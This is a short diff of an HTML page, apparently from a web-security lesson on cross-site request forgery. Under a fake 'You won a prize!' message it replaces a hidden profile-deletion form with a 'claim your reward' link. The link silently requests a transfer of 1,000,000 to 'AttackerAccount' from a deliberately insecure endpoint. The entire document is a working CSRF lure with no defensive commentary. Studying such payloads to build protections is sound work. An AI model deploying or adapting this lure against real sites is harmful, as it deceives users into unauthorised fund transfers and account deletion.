@@ -1,7 +1,5 @@
 <html lang="en-US">
-<form action="delete-profile.php/?confirm=true">
     <p>You won a prize!</p>
-    <button type="submit">Click here to claim your reward!</button>
-</form>
+    <a href="transfer-funds-insecure.php/?transfer-to=AttackerAccount&amount=1000000" type="button">Click here to claim your reward!</a>
 </html>
 
